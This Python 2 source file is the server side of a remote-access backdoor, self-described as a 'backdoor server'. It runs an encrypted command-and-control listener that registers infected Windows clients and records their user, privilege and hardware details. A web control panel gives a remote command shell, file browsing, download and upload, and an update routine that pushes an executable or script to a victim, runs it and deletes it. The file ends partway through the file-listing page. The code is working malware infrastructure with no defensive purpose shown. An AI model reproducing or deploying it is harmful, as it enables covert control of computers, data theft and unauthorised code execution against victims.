#!/usr/bin/env python
# -*- coding: utf-8 -*-

import sys, os, struct, re, errno, time, random, hashlib, traceback, tempfile
import signal, subprocess
import select, socket, urllib
import json, cgi, mimetypes
from threading import Thread
from optparse import OptionParser, make_option

try: 

    # https://pypi.org/project/M2Crypto/
    import M2Crypto, M2Crypto.RSA, M2Crypto.X509

except ImportError:

    print('ERROR: M2Crypto is not installed')
    exit(-1)

try: 

    # https://pypi.org/project/pycrypto/
    import Crypto, Crypto.Cipher.ARC4

except ImportError:

    print('ERROR: pycrypto is not installed')
    exit(-1)

try: 

    # https://pypi.org/project/CherryPy/
    import cherrypy, cherrypy.process.plugins

except ImportError:

    print('ERROR: CherryPy is not installed')
    exit(-1)

try: 

    # https://pypi.org/project/redis/
    import redis

except ImportError:

    print('ERROR: redis is not installed')
    exit(-1)

try:

    # https://pypi.org/project/defusedxml/
    import defusedxml.minidom

except ImportError:

    print('ERROR: defusedxml is not installed')
    exit(-1)

from config import Conf

BUFF_SIZE = 0x200

SECURITY_MANDATORY_LOW_RID      = 0x00001000
SECURITY_MANDATORY_MEDIUM_RID   = 0x00002000
SECURITY_MANDATORY_HIGH_RID     = 0x00003000
SECURITY_MANDATORY_SYSTEM_RID   = 0x00004000

g_log_file = None
g_start_time = time.time()

log_timestamp = lambda: time.strftime(Conf.TIME_FORMAT, time.localtime())

mimetypes.init()
mimetypes.types_map['.log'] = 'text/plain'

def log_write(data):

    global g_log_file

    data = '[%s]: %s' % (log_timestamp(), data)
    data = data.encode('UTF-8')

    if g_log_file is not None:

        g_log_file.write(data)
        g_log_file.flush()

    sys.stdout.write(data)
    sys.stdout.flush()

def log_open(path):

    global g_log_file

    log_write(u'Log file path is \"%s\"\n' % path)

    g_log_file = open(path, 'wb')

def shutdown():

    try:         

        # read PGID value
        pgid = int(open(Conf.PGID_FILE_PATH, 'r').read().strip())

    except Exception:

        print('Error while reading PGID from \"%s\"' % Conf.PGID_FILE_PATH)
        return

    print('[+] Terminating process with PGID = %d' % pgid)

    # shutdown running process
    code = os.system('kill -- -%d 2> /dev/null' % pgid)
    if code == 0:

        print('[+] DONE')

    else:

        print('Error %d while terminating process' % code)

class Client(object):

    def __init__(self, client_id, **props):

        self.client_id, self.props = client_id, props

        for name, val in props.items():

            setattr(self, name, val)        

class ClientHelper(object):

    def __init__(self, client_id = None, sock = None):

        self.sock, self.client_id = sock, client_id
        self.redis = None

    def send(self, data):

        # send all of the data
        return self.sendall(data)

    def sendall(self, data):

        assert self.sock is not None

        return self.sock.sendall(data)            

    def recv(self, size):

        assert self.sock is not None

        return self.sock.recv(size)

    def recvall(self, size):

        ret = ''

        assert self.sock is not None

        while len(ret) < size:
            
            # receive specified amount of data
            data = self.sock.recv(size - len(ret))
            assert len(data) > 0

            ret += data

        return ret

    def create_folders(self):

        assert self.client_id is not None

        if not os.path.isdir(Conf.LOG_DIR_PATH):

            # create base logs folder
            os.mkdir(Conf.LOG_DIR_PATH)    

        if not os.path.isdir(Conf.DOWNLOADS_DIR_PATH):

            # create base downloads folder
            os.mkdir(Conf.DOWNLOADS_DIR_PATH)        

        log_path = os.path.join(Conf.LOG_DIR_PATH, '%s.log' % self.client_id)
        downloads_path = os.path.join(Conf.DOWNLOADS_DIR_PATH, self.client_id)

        if not os.path.isfile(log_path):

            # create client log file
            with open(log_path, 'wb'): pass

        if not os.path.isdir(downloads_path):

            # create client downloads folder
            os.mkdir(downloads_path)    

    def get_id(self):

        assert self.sock is not None

        # query client ID
        self.sendall('id\n')

        ret = ''

        while len(ret) == 0 or ret[-1] != '\n':
            
            data = self.recv(BUFF_SIZE)
            assert len(data) > 0

            ret += data

        data = data.strip()

        # validate received ID
        assert len(data) == 128 / 8 * 2
        assert re.search('^[A-Fa-f0-9]+$', data) is not None

        return data

    def get_info(self):

        assert self.sock is not None

        # query basic client information
        self.sendall('info\n')

        ret = ''

        while len(ret) == 0 or ret[-1] != '\n':
            
            data = self.recv(BUFF_SIZE)
            assert len(data) > 0

            ret += data

        # parse and validate received information
        ret = ret.decode('UTF-8').strip().split('|')

        return ret if len(ret) == 6 else None

    def ping(self):

        assert self.sock is not None

        self.sendall('ping\n')

    def exit(self):

        assert self.sock is not None

        self.sendall('exit\n')

    def uninstall(self):

        assert self.sock is not None

        self.sendall('uninst\n')

    def _is_end_of_output(self, data):    

        # check for end of the command output magic value
        m = re.search('\{\{\{#([0123456789abcdef]{8})\}\}\}$', data)
        if m is not None:

            # get exit code value
            return data[: data.find(m.group(0))], int('0x' + m.group(1), 16)

        return None

    def _execute(self, cmd, stream = None):

        cmd = cmd.strip()

        assert len(cmd) > 0
        assert self.sock is not None

        # send command string
        self.sendall(cmd.encode('UTF-8') + '\n')

        ret, code = '', None

        while True:

            # receive the command output
            data = self.recv(BUFF_SIZE)
            assert len(data) > 0            

            m = self._is_end_of_output(data)
            if m is not None:

                # end of the command output
                data, code = m

            ret += data            

            if m is not None: 

                break

        ret = ret.decode('UTF-8')

        if stream is not None: 

            # write data to the stream at the end of the output
            stream.write(ret)

        return ret, code

    def execute(self, cmd, stream = None, log = True):

        assert self.client_id is not None

        log_path = os.path.join(Conf.LOG_DIR_PATH, '%s.log' % self.client_id)

        with open(log_path, 'ab') as fd:

            if log:

                message = u'[%s]: COMMAND: %s\n' % (log_timestamp(), cmd)

                # write log file message
                fd.write(message.encode('UTF-8'))

            # execute command on the client
            data, code = self._execute('exec ' + cmd.strip(), stream = stream)

            if log:

                # log command output
                fd.write('[%s]: EXIT CODE: 0x%.8x\n\n' % (log_timestamp(), code))
                fd.write(data.encode('UTF-8') + '\n')

            return data, code

    def temp_path(self):

        # query %TEMP% environment variable from the client
        data, code = self.execute('echo %TEMP%', log = False)
        data = data.strip()

        if len(data) > 0 and data[-1] == '\\':

            # remove ending slash
            data = data[: -1]

        assert code == 0
        assert len(data) > 0

        return data

    def execute_wmi(self, wmi_class, props = None):

        assert self.client_id is not None

        query = '%s get ' % wmi_class

        if isinstance(props, basestring): query += props
        elif isinstance(props, list): query += ','.join(props)

        log_write(u'execute_wmi(%s): %s\n' % (self.client_id, query))

        # execute WMI query with XML output
        data, code = self.execute('wmic %s /format:rawxml' % query, log = False)
        data = data.strip()

        if code != 0:

            log_write(u'execute_wmi(%s) ERROR: wmic returned 0x%x\n' % (self.client_id, code))
            return None        

        try:

            assert len(data) > 0

            # parse query results
            doc = defusedxml.minidom.parseString(data)
            root = doc.documentElement
            res = root.getElementsByTagName('RESULTS')[0]

            try:

                # check for an error
                err = res.getElementsByTagName('ERROR')[0]
                log_write(u'execute_wmi(%s) ERROR: Bad result\n' % self.client_id)
                return None

            except IndexError: pass

            ret = {}

            # enumerate returned properties
            for e in res.getElementsByTagName('PROPERTY'):

                name = e.getAttribute('NAME')
                vals = e.getElementsByTagName('VALUE')

                if len(vals) > 0 and len(vals[0].childNodes) > 0: 

                    # get property value
                    ret[name] = vals[0].childNodes[0].data

                else: 

                    ret[name] = None

            if isinstance(props, basestring): return ret[props]

            return ret

        except Exception, why:

            log_write(u'execute_wmi(%s) ERROR: %s\n' % (self.client_id, str(why)))
            return None

    def os_version(self):

        # get oprating system information from appropriate WMI class
        data = self.execute_wmi('os', props = [ 'Name', 'OSArchitecture' ])
        if data is None: return None

        try:
        
            # parse returned data
            return '%s %s' % (data['Name'].split('|')[0], data['OSArchitecture'])

        except KeyError:

            return None

    def hardware_info(self):

        # get CPU information
        info_cpu = self.execute_wmi('cpu', props = 'Name')
        if info_cpu is None: return None

        # get memory information
        info_mem = self.execute_wmi('os', props = 'TotalVisibleMemorySize')
        if info_mem is None: return None

        try:
        
            # parse returned data
            return '%s, %d GB RAM' % (info_cpu, int(info_mem) / (1024 * 1024) + 1)

        except KeyError:

            return None

    def update(self, path):

        assert os.path.isfile(path)

        name = os.path.basename(path)
        cmd, ext = '', name.split('.')[-1]

        # get temporary location to save the executable
        remote_path = self.temp_path() + '\\' + name

        if ext == 'exe': 

            # regular PE EXE
            cmd = remote_path

        elif ext == 'js': 

            # JScript file to be exected with cscript.exe
            cmd = 'cscript.exe ' + remote_path

        else:

            log_write(u'update(%s) ERROR: Unknown file type' % self.client_id)
            return False

        # upload file to the client
        if not self.file_put(remote_path, path):

            return False

        remote_cmd = 'cmd.exe /C "%s & ping 127.0.0.1 -n 3 > NUL & del %s"' % \
                     (cmd.encode('UTF-8'), remote_path.encode('UTF-8'))

        log_write(u'update(%s): %s\n' % (self.client_id, remote_cmd))

        # execute update command on the client
        self.sendall('upd ' + remote_cmd + '\n')

        try:

            assert len(self.recvall(1)) > 0
            return False

        except:

            return True

    def file_list(self, path):

        assert self.client_id is not None

        log_write(u'file_list(%s): %s\n' % (self.client_id, path))

        # list of the files in specified folder
        data, code = self._execute('flist ' + path.strip())
        if code != 0: 

            # command failed
            log_write(u'ERROR: file_list() failed with code 0x%.8x\n' % code)
            return None

        ret = []

        # enumerate results
        for line in data.strip().split('\n'):

            if len(line) == 0: continue

            line = line.split(' ')
            assert len(line) > 1

            # parse single file/directory information
            ret.append(( None if line[0] == 'D' else int(line[0], 16), ' '.join(line[1 :]) ))

        return ret

    def file_get(self, path, local_path):

        ret = False

        assert len(path) > 0
        assert self.sock is not None
        assert self.client_id is not None

        log_write(u'file_get(%s): Downloading file \"%s\" into the \"%s\"\n' % \
                  (self.client_id, path, local_path))

        # send download file command
        self.sendall('fget ' + path.encode('UTF-8') + '\n')

        with open(local_path.encode('UTF-8'), 'wb') as fd:            

            # receive file size
            size = self.recvall(8)
            assert len(size) == 8

            size = struct.unpack('Q', size)[0]
            if size != 0xffffffffffffffff:

                recvd = 0

                log_write(u'file_get(%s): File size is %d\n' % (self.client_id, size))

                while recvd < size:
                    
                    # receive file contents
                    data = self.recv(min(BUFF_SIZE, size - recvd))
                    if len(data) == 0:

                        raise(Exception('Connection error'))

                    # write the data into the local file
                    fd.write(data)
                    recvd += len(data)

                ret = True

            else:

                # command failed
                log_write(u'ERROR: file_get() failed\n')

        if not ret and os.path.isfile(local_path):

            # remove local file in case of any errors
            os.unlink(local_path)

        return ret

    def file_put(self, path, local_path):

        ret = False

        assert len(path) > 0
        assert os.path.isfile(local_path)
        assert self.sock is not None
        assert self.client_id is not None

        log_write(u'file_put(%s): Uploading file \"%s\" into the \"%s\"\n' % \
                  (self.client_id, local_path, path))

        # get local file size
        size = os.path.getsize(local_path)

        log_write(u'file_put(%s): File size is %d\n' % (self.client_id, size))

        # send upload file command 
        self.sendall('fput ' + path.encode('UTF-8') + '\n')

        status = self.recvall(1)
        assert len(status) == 1

        status = struct.unpack('B', status)[0]
        if status == 0:

            # command failed
            log_write(u'ERROR: file_put() failed\n')
            return False

        # send file size
        self.sendall(struct.pack('Q', size))

        with open(local_path, 'rb') as fd:

            sent = 0

            while sent < size:

                # read file contents from the local file
                data = fd.read(min(BUFF_SIZE, size - sent))
                assert len(data) > 0
                
                # send data to the client
                self.sendall(data)
                sent += len(data)

            ret = True

        return ret

    def mapper_connect(self):

        # query client informaion
        client = self.client_get()
        if client is None: 

            return False

        # connect to the client process
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.connect(( Conf.MAPPER_HOST, client.map_port ))

        return True

    def redis_connect(self):

        if self.redis is None:

            # connect to the database
            self.redis = redis.Redis(host = Conf.REDIS_HOST, port = Conf.REDIS_PORT, db = Conf.REDIS_DB)

    def client_add(self, **props):

        assert self.client_id is not None

        self.redis_connect()

        log_write(u'client_add(%s)\n' % self.client_id)

        # add client info to the database
        self.redis.set(self.client_id, json.dumps(props))

    def client_get(self, client_id = None):

        client_id = self.client_id if client_id is None else client_id
        assert client_id is not None

        self.redis_connect()

        # get client info from the database
        data = self.redis.get(client_id)

        # create Client instance
        return data if data is None else Client(client_id, **json.loads(data))

    def client_del(self):

        assert self.client_id is not None

        self.redis_connect()

        log_write(u'client_del(%s)\n' % self.client_id)

        # remove client info from the database
        self.redis.delete(self.client_id)

    def client_del_all(self):

        self.redis_connect()

        self.redis.flushdb()

    def client_list(self):

        self.redis_connect()

        ret = []

        # enumerate all the known clients
        for k in self.redis.keys():

            # query each client infor
            client = self.client_get(k)
            if client is not None: ret.append(client)

        return ret

class KeysManager(object):

    ''' Certificate properties. '''
    CERT_KEY_BITS = 2048
    CERT_KEY_SIZE = CERT_KEY_BITS / 8
    CERT_ENCRYPTION = 'rsa:' + str(CERT_KEY_BITS)
    CERT_SUBJECT = '/C=AU/ST=Some-State/O=Internet Widgits Pty Ltd'
    CERT_EXPIRE = 365
    CERT_DIGEST_NAME = 'sha1'
    CERT_DIGEST_BITS = 160
    CERT_DIGEST_SIZE = CERT_DIGEST_BITS / 8

    ''' Getters for private key. '''
    get_key_path = lambda self, peer_name: os.path.join(self.keys_dir, peer_name) + '.key'
    get_key_data = lambda self, peer_name: open(self.get_key_path(peer_name)).read()

    ''' Getters for public certiicate. '''
    get_cert_path = lambda self, peer_name: os.path.join(self.keys_dir, peer_name) + '.crt'
    get_cert_data = lambda self, peer_name: open(self.get_cert_path(peer_name)).read()

    def __init__(self, keys_dir, openssl_win32_dir = None):

        self.keys_dir = keys_dir        
        self.openssl_win32_config_path = None

        if sys.platform == 'win32':

            assert openssl_win32_dir is not None

            # generate path to the win32 openssl executable
            self.openssl_win32_dir = openssl_win32_dir
            self.openssl_win32_path = os.path.join(openssl_win32_dir, 'bin', 'openssl.exe')
            self.openssl_win32_config_path = os.path.join(openssl_win32_dir, 'share', 'openssl.cnf')

            if not os.path.isfile(self.openssl_win32_path):

                raise(IOError('%s is not found' % self.openssl_win32_path))

            # use win32 version
            self.openssl_command = self.openssl_win32_path

        else:

            # use version that installed into the host system
            self.openssl_command = 'openssl'

    def generate_files(self, peer_name):

        def prepare_file(file_path):

            if os.path.isfile(file_path):

                # delete existing file
                os.unlink(file_path)

            return file_path
        
        key_path  = prepare_file(self.get_key_path(peer_name))
        cert_path = prepare_file(self.get_cert_path(peer_name))

        print('Generating \"%s\" and \"%s\"' % (key_path, cert_path))

        args = [ self.openssl_command,
                 'req', '-x509', '-nodes',
                 '-newkey', self.CERT_ENCRYPTION, 
                 '-keyout', key_path,
                 '-out', cert_path,
                 '-days', str(self.CERT_EXPIRE),
                 '-subj', self.CERT_SUBJECT ]        

        if self.openssl_win32_config_path is not None:

            args += [ '-config', self.openssl_win32_config_path ]

        # generating self-signed certificate using OpenSLL
        subprocess.call(args)

        def check_file(file_path):

            # check that file was sucessfully generated
            if not file_path:

                raise(Exception('%s wasn\'t generated' % file_path))

            return file_path

        check_file(key_path)
        check_file(cert_path)

    def generate(self, peer_name, overwrite = False):

        if not overwrite:

            if os.path.isfile(self.get_key_path(peer_name)) and \
               os.path.isfile(self.get_cert_path(peer_name)):

                   sys.stdout.write('Certificate for %s is already exists, overwrite? [Y/N]: ' % peer_name)

                   if sys.stdin.read(1).lower() != 'y':
                   
                        print('\n *** Abort!')
                        return

        print('')

        self.generate_files(peer_name)

        print('')

class ClientMapper(Thread):

    daemon = True

    def __init__(self, addr, server):

        self.addr, self.server = addr, server

        super(ClientMapper, self).__init__()

    def stop(self):

        self.running = False
        self.join()

    def run(self): 

        self.running = True

        # bind socket for the data transfer connection
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        
        sock.settimeout(1)

        sock.bind(self.addr)
        sock.listen(1)

        while self.running:            
        
            try:

                # accept client connection
                self.server.client_sock, client_addr = sock.accept()     

            except:

                continue

            if Conf.VERBOSE: log_write(u'MAPPER: Client %s:%d connected\n' % client_addr)

            while self.running:

                if self.server.client_sock is None:

                    if Conf.VERBOSE: log_write(u'MAPPER: Client %s:%d disconnected\n' % client_addr)
                    break

                time.sleep(1)

class ClientDispatcher(object):    

    CLIENT_SESSION_KEY_BITS = 128
    CLIENT_SESSION_KEY_SIZE = CLIENT_SESSION_KEY_BITS / 8     

    def __init__(self, request, client_address):

        self.request = request
        self.client_address = client_address
        self.client_sock = None

        self.load_keys()

    def load_keys(self):
        ''' Initialize encryption keys and certificates '''

        self.crypt_send = None
        self.crypt_recv = None

        def cert_digest(peer_id):

            # get certificate path
            path = self.keys_manager.get_cert_path(peer_id)

            # load X509 certificate and compute hexadecimal digest
            cert = M2Crypto.X509.load_cert(path)
            return cert.get_fingerprint(self.keys_manager.CERT_DIGEST_NAME).upper()

        self.keys_manager = KeysManager(Conf.CERT_DIR_PATH)

        # load certificate and private key of server
        self.server_key = M2Crypto.RSA.load_key(self.keys_manager.get_key_path(Conf.CERT_NAME))
        self.server_cert = M2Crypto.X509.load_cert(self.keys_manager.get_cert_path(Conf.CERT_NAME))
        self.server_cert_digest = cert_digest(Conf.CERT_NAME)

    def _recv(self, size = None):

        ret = ''

        if size is None:

            return self.request.recv(BUFF_SIZE)        

        while len(ret) < size:
            
            # receive specified amount of data
            data = self.request.recv(size - len(ret))
            assert len(data) > 0

            ret += data

        return ret

    def _send(self, data):

        ret = 0

        while ret < len(data):
            
            # send all of the data
            size = self.request.send(data[ret :])
            assert size > 0

            ret += size

        return ret

    def _do_auth(self):

        if self.crypt_send is not None and self.crypt_recv is not None:

            return True

        class RC4Stream(object):

            def __init__(self, client, key):

                self.client = client
                self.ctx_send, self.ctx_recv = Crypto.Cipher.ARC4.new(key), \
                                               Crypto.Cipher.ARC4.new(key)                        

            def sendall(self, data): 

                assert self.ctx_send is not None

                return self.client.request.sendall(self.ctx_send.encrypt(data))

            def send(self, data):                

                return self.sendall(data)

            def recv(self, size):

                assert self.ctx_recv is not None

                return self.ctx_recv.encrypt(self.client.request.recv(size))

        # receive session key encrypted with the server public RSA key
        data = self._recv(self.keys_manager.CERT_KEY_SIZE)   

        try:

            # decrypt PKCS#1 encoded data
            data = self.server_key.private_decrypt(data, M2Crypto.RSA.pkcs1_padding)
        
            fmt = 'I%ds%ds' % (self.keys_manager.CERT_DIGEST_SIZE, \
                               self.CLIENT_SESSION_KEY_SIZE)

            # parse decrypted data
            ver, digest, key = struct.unpack(fmt, data)

        except:

            raise(Exception('Bad authorization request received from %s:%d' % self.client_address))        

        # check server certificate digest
        digest = ''.join(map(lambda b: '%.2X' % ord(b), digest))
        if digest != self.server_cert_digest:

            raise(Exception('Authorization failed for %s:%d' + self.client_address))

        if ver != Conf.CLIENT_VERSION:

            raise(Exception('Bad protocol version for %s:%d' % self.client_address))

        # send MD5 hash of session key to client to proove successful auth
        self._send(hashlib.md5(key).digest())

        # initialize RC4 context for client traffic encryption
        return RC4Stream(self, key)

    def handle(self):

        def _client_sock_close():

            self.client_sock.close()
            self.client_sock = None

        addr = ( Conf.MAPPER_HOST, random.randrange(Conf.MAPPER_PORT_MIN, Conf.MAPPER_PORT_MAX) )         
        mapper, helper = None, None

        try:

            # perform authentication
            stream = self._do_auth()

            # create client instance 
            helper = ClientHelper(sock = stream)
            helper.client_id = helper.get_id()

            # create folders for client files
            helper.create_folders()

            log_write(u'SERVER: Client %s:%d connected (ID = %s, PID = %d, port = %d)\n' % \
                (self.client_address[0], self.client_address[1], helper.client_id, os.getpid(), addr[1]))

            helper.client_add(addr = self.client_address, map_port = addr[1], map_pid = os.getpid(), 
                              os_version = helper.os_version(), hardware = helper.hardware_info(), info = helper.get_info())

            # start mapper to receive connections from the main process
            mapper = ClientMapper(addr, self)
            mapper.start()

            last_request = time.time()
            
            while True:

                sock_list = [ self.request ] if self.client_sock is None else \
                            [ self.request, self.client_sock ]

                # transfer data between sockets
                read, write, err = select.select(sock_list, [], [], 1)

                if self.request in read:

                    # receive data from the client
                    data = stream.recv(BUFF_SIZE)
                    if len(data) == 0: break

                    # check for ping from the client
                    if re.search('^\{\{\{\$[0123456789abcdef]{8}\}\}\}$', data) is not None:

                        if Conf.VERBOSE: log_write(u'SERVER: Ping from client %s:%d\n' % self.client_address)

                    elif self.client_sock is not None: 

                        # send data to the main process
                        self.client_sock.sendall(data)

                    last_request = time.time()

                if self.client_sock in read:

                    data = None

                    try:                         

                        # receive data from the main process
                        data = self.client_sock.recv(BUFF_SIZE)
                        assert len(data) > 0                        

                    except: 

                        data = None

                    if data is None:

                        _client_sock_close()

                    else:

                        # send data to the client
                        stream.send(data) 

                if time.time() - last_request >= Conf.CLIENT_TIMEOUT:

                    log_write(u'SERVER: Client %s:%d timeout occured\n' % self.client_address)
                    break

        except Exception, why:

            log_write(u'ERROR: Exception in handle():\n')
            log_write(u'-----------------------------------------\n')
            log_write(traceback.format_exc())
            log_write(u'-----------------------------------------\n')

        log_write(u'SERVER: Client %s:%d disconnected\n' % self.client_address)

        if self.client_sock is not None:

            _client_sock_close()

        if mapper is not None:

            mapper.stop()            

        if helper is not None:

            helper.client_del()

        self.request.close()

class Daemon:
    """ Detach a process from the controlling terminal and run it in the
    background as a daemon.
    """

    UMASK = 0
    REDIRECT_TO = os.devnull

    def __init__(self):  

        sys.stdout.flush()
        sys.stderr.flush()     

        log_write(u'Going to the background...\n')

        try:
          
            # fork a child process so the parent can exit
            pid = os.fork()

        except OSError, why: 

            raise(Exception('Daemon() ERROR: ' + str(why)))

        if pid == 0:
          
            # call os.setsid() to become the session leader of this new session
            os.setsid()    

            try:

                # fork a second child and exit immediately to prevent zombies
                pid = os.fork()

            except OSError, why: 

                raise(Exception('Daemon() ERROR: ' + str(why)))

            if pid == 0:

                # give the child process complete control over permissions
                os.umask(self.UMASK)

            else:

                time.sleep(2)

                # exit parent (the first child) of the second child
                os._exit(0)

        else:

            time.sleep(2)

            # exit parent of the first child
            os._exit(0) 

        # redirect the standard I/O file descriptors to the specified file  
        si = file(self.REDIRECT_TO, 'r')
        so = file(self.REDIRECT_TO, 'a+')
        se = file(self.REDIRECT_TO, 'a+', 0)

        os.dup2(si.fileno(), sys.stdin.fileno())
        os.dup2(so.fileno(), sys.stdout.fileno())
        os.dup2(se.fileno(), sys.stderr.fileno())

class Server(object):

    def __init__(self, addr, port):

        self.addr = ( addr, port )        

        log_write(u'Starting backdoor server at address %s:%d\n' % self.addr)        

        # bind socket for the data transfer connection
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)    

        self.sock.bind(self.addr)
        self.sock.listen(1)

    def serve_forever(self):

        while True:

            try:

                # accept client connection
                client_sock, client_addr = self.sock.accept()  

            except socket.error: 

                continue

            pid = os.fork()
            if pid == 0:   

                random.seed()

                ClientDispatcher(client_sock, client_addr).handle()   

                exit(0)

            else:

                client_sock.close()

class ServerHttpAdmin(object):    

    # default web page template
    tmpl = '''<html>
<head>
<meta charset="UTF-8" />
<title>%s</title>
<link rel="shortcut icon" href="''' + Conf.HTTP_PATH + '''/static/favicon.png" />
<link rel="stylesheet" type="text/css" href="''' + Conf.HTTP_PATH + '''/static/jquery.terminal.css" />
<link rel="stylesheet" type="text/css" href="''' + Conf.HTTP_PATH + '''/static/main.css" />
<link rel="stylesheet" type="text/css" href="''' + Conf.HTTP_PATH + '''/static/fonts/ibm-plex.css" />
<script src="''' + Conf.HTTP_PATH + '''/static/jquery-1.9.1.min.js"></script>
<script src="''' + Conf.HTTP_PATH + '''/static/jquery.terminal-0.7.6.min.js"></script>
<script src="''' + Conf.HTTP_PATH + '''/static/main.js"></script>
%s
</head><body><div>%s</div>
</body></html>

    '''

    to_html = lambda self, title, text, refresh = None: \
                     self.tmpl % (title, '' if refresh is None else ('<meta http-equiv="refresh" content="%d" />' % refresh), text)

    to_link = lambda self, url, text, blank = False: \
                     '<a href="%s"%s>%s</a>' % (url, ' target="_blank"' if blank else '', cgi.escape(text))

    def __init__(self, data):
    
        self.data = data

    def uptime_to_str(self, val):

        t_sec  = val % 60
        t_min  = (val / 60) % 60
        t_hour = ((val / 60) / 60) % 24
        t_day  = (((val / 60) / 60) / 24) % 30

        return '%d days, %d hours, %d min, %d sec' % (t_day, t_hour, t_min, t_sec)

    @cherrypy.expose
    def client(self, cancel = False, **data):

        assert data.has_key('id')
        assert data.has_key('c')

        client_id, command = data['id'], data['c']
        helper = ClientHelper(client_id)

        if not helper.mapper_connect():

            raise(Exception('No such client'))

        if command == 'uninst':
            
            helper.uninstall()

        time.sleep(3)

        raise cherrypy.HTTPRedirect(Conf.HTTP_PATH)

    @cherrypy.expose
    def execute(self, cancel = False, **data):

        assert data.has_key('id')
        assert data.has_key('c')

        client_id, command = data['id'], data['c']
        helper = ClientHelper(client_id)

        if not helper.mapper_connect():

            raise(Exception('No such client'))        
        
        # execute command on the client and get the output
        data, _ = helper.execute(command)

        return data

    @cherrypy.expose
    def index(self, cancel = False, **data): 

        title = 'Control Pannel'

        global g_start_time

        # get clients list
        clients = ClientHelper().client_list()

        data = '<img class="hdr" src="' + Conf.HTTP_PATH + '/static/logo.png" width="511" height="64"/>\n'

        data += '  <b>Clients</b> %d\n' % len(clients)
        data += '  <b> Uptime</b> %s\n' % self.uptime_to_str(int(time.time() - g_start_time))
        
        data += '\n          '
        data += '<div class="btn btn-red">' + self.to_link(Conf.HTTP_PATH + '/shutdown', 'Shutdown')              + '</div>  '
        data += '<div class="btn">' + self.to_link(Conf.HTTP_PATH + '/downloads', 'All Downloads', blank = True)  + '</div>  '
        data += '<div class="btn">' + self.to_link(Conf.HTTP_PATH + '/logs', 'All Logs', blank = True)            + '</div>  '
        data += '<div class="btn">' + self.to_link(Conf.HTTP_PATH + '/server.log', 'Server Log', blank = True)    + '</div>  '
        data += '<div class="btn">' + self.to_link(Conf.HTTP_PATH + '/access.log', 'Access Log', blank = True)    + '</div>  '                
        data += '\n\n'

        for client in clients:

            data += '<div class="client">\n'
            data += '       <b>ID</b> %s\n' % client.client_id
            data += '  <b>Address</b> %s\n' % client.addr[0]
            data += '  <b>Version</b> %s\n' % ('<UNKNOWN>' if client.os_version is None else cgi.escape(client.os_version))
            data += ' <b>Hardware</b> %s\n' % ('<UNKNOWN>' if client.hardware is None else cgi.escape(client.hardware))

            if client.info is not None:

                try:

                    # parse client information
                    computer, user, pid, path, admin, integrity = client.info
                    
                    computer = cgi.escape(computer)
                    user = cgi.escape(user)
                    path = cgi.escape(path.split('\\')[-1])

                    pid, admin, integrity = int(pid), int(admin), int(integrity)

                    try:

                        # get integruty level string from the RID constant
                        integrity = {    SECURITY_MANDATORY_LOW_RID: 'Low',
                                      SECURITY_MANDATORY_MEDIUM_RID: 'Medium',
                                        SECURITY_MANDATORY_HIGH_RID: 'High',
                                      SECURITY_MANDATORY_SYSTEM_RID: 'System',
                                                                  0: 'None' }[integrity]

                    except KeyError:

                        integrity = 'Unknown'

                    data += '  <b>Process</b> %s, PID = %d, integrity = %s\n' % (path, pid, integrity)
                    data += '     <b>User</b> %s\\%s, admin = %s\n' % (computer, user, 'Y' if admin == 1 else 'N')

                except Exception, why:

                    data += '                 <font color="red">%s</font>\n' % cgi.escape(str(why))

            data += '\n          '
            data += '<div class="btn btn-red">' + self.to_link('%s/client?id=%s&c=uninst' % (Conf.HTTP_PATH, client.client_id), 'Shutdown')            + '</div>  '
            data += '<div class="btn btn-blue">' + self.to_link('%s/shell?id=%s' % (Conf.HTTP_PATH, client.client_id), 'Command Shell', blank = True)  + '</div>  '
            data += '<div class="btn btn-blue">' + self.to_link('%s/flist?id=%s&p=' % (Conf.HTTP_PATH, client.client_id), 'Files', blank = True)       + '</div>  '
            data += '<div class="btn">' + self.to_link('%s/downloads/%s' % (Conf.HTTP_PATH, client.client_id), 'Downloads', blank = True)              + '</div>  '
            data += '<div class="btn">' + self.to_link('%s/logs/%s.log' % (Conf.HTTP_PATH, client.client_id), 'Log', blank = True)                     + '</div>  '
            data += '\n</div>\n'        

        return self.to_html(title, data, refresh = 10)

    @cherrypy.expose
    def shell(self, cancel = False, **data): 

        title = 'Command Shell'

        assert data.has_key('id')

        client_id = data['id']
        
        client = ClientHelper(client_id).client_get()
        if client is None:

            return self.to_html(title, '<font color="red">ERROR: No such client</font>')

        data = '''<div class="info">
      <b>ID</b> %s
 <b>Address</b> %s

</div>
<div class="shell-output" id="shell-output"></div>
<script>

  $(document).ready(function() { term_init("''' + Conf.HTTP_PATH + '''/execute", "%s"); });

</script>
'''

        return self.to_html(title, data % (client_id, client.addr[0], client_id))

    @cherrypy.expose
    def flist(self, cancel = False, **data): 

        title = 'Files'

        assert data.has_key('id')
        assert data.has_key('p')

        client_id, path = data['id'], urllib.unquote_plus(data['p'])
        helper = ClientHelper(client_id)
        
        if not helper.mapper_connect():

            return self.to_html(title, '<font color="red">ERROR: No such client</font>')

        client = helper.client_get()
        
        files = helper.file_list(path)
        if files is None:

            return self.to_html(title, '<font color="red">ERROR: Can\'t list files in "%s"</font>' % path)

        data = '''<div class="info">
      <b>ID</b> %s
 <b>Address</b> %s
    <b>Path</b> %s

'''

        if len(path) > 0:

            data += '<form action="%s/fput?id=%s&p=%s" method="POST" enctype="multipart/form-data">  <b>Upload</b>: <input type="submit" value="Submit" /><input type="file" name="file" /></form>' % \
                     (Conf.HTTP_PATH, client_id, path)

        data += '''</div>
'''
        temp, nav, items = '', [], path.split('\\')

        to_quote = lambda s: urllib.quote_plus(s.encode('UTF-8'))
        to_path = lambda name: to_quote(path + '\\' + name if len(path) > 0 else name)

        for i in range(len(items)):

            # make current path for bavigation bar
            nav.append(self.to_link('%s/flist?id=%s&p=%s' % \
                                     (Conf.HTTP_PATH, client_id, 
                                      to_quote('\\'.join(items[: i + 1]))), items[i]))

        if len(path) > 0:

            temp += '%15s [%s]\n' % ('', self.to_link('%s/flist?id=%s&p=%s' % \
                                     (Conf.HTTP_PATH, client_id, 
                                      to_quote('\\'.join(items[: -1]))), '..'))

        for size, name in files:

            if size is None:

                # list directories
                temp += '%15s [%s]\n' % ('', self.to_link('%s/flist?id=%s&p=%s' % \
                                         (Conf.HTTP_PATH, client_id, to_path(name)), name))

        for size, name in files:

            if size is not None:

                # list files
